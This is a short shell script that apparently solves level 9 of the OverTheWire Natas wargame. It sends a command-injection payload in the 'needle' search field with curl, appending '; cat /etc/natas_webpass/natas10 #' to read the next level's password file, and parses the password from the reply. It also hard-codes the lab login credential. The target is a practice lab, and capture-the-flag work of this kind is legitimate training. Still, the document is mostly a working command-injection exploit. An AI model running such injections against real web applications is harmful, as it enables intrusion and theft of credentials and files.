#! /bin/sh

NEEDLE="; cat /etc/natas_webpass/natas10 #"
RESPONSE=$(curl -G http://natas9.natas.labs.overthewire.org \
                --silent \
                --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl \
                --data-urlencode "needle=${NEEDLE}" \
                --data-urlencode "submit=Search")
PASSWORD=$(echo ${RESPONSE} | grep -Eo "<pre>.*</pre>" | grep -Eo [A-Za-z0-9]{32})
printf "The password for natas10 is: ${PASSWORD}\n"
